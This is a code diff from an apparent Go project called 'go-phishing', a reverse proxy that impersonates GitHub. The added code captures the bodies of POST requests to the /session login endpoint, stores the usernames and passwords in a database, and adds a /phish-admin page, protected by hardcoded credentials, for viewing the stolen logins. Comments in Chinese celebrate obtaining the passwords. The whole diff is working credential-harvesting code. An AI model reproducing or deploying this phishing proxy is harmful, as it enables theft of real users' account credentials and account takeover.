@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"go-phishing/db"
 	"io/ioutil"
@@ -38,7 +39,16 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 func cloneRequest(r *http.Request) *http.Request {
 	// 取得原請求的 method、body
 	method := r.Method
-	body := r.Body
+	// 把 body 讀出來轉成 string
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+
+	// 如果是 POST 到 /session 的請求
+	// 就把 body 存進資料庫內（帳號密碼 GET !!）
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+	body := bytes.NewReader(bodyByte)
 
 	// 取得原請求的 url，把它的域名替換成真正的 Github
 	path := r.URL.Path
@@ -61,6 +71,7 @@ func cloneRequest(r *http.Request) *http.Request {
 		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
 		req.Header["Cookie"][i] = newValue
 	}
+
 	return req
 }
 
@@ -86,6 +97,17 @@ func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
 
 	// 回傳 body
 	return respBody, resp.Header, resp.StatusCode
+}
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	username, password, ok := r.BasicAuth()
+	if username == "budda" && password == "budda" && ok {
+		strs := db.SelectAll()
+		w.Write([]byte(strings.Join(strs, "\n\n")))
+	} else {
+		w.Header().Add("WWW-Authenticate", "Basic")
+		w.WriteHeader(401)
+		w.Write([]byte("不給你看勒"))
+	}
 }
 
 func handler(w http.ResponseWriter, r *http.Request) {
@@ -135,11 +157,10 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 func main() {
 	db.Connect()
-	db.Insert("Hello World")
-	db.Insert("I'm Budda Lee")
-	for _, str := range db.SelectAll() {
-		fmt.Println(str)
-	}
+	http.HandleFunc("/phish-admin", adminHandler)
+	// for _, str := range db.SelectAll() {
+	// 	fmt.Println(str)
+	// }
 	http.HandleFunc("/", handler)
 	err := http.ListenAndServe(":8080", nil)
 	if err != nil {
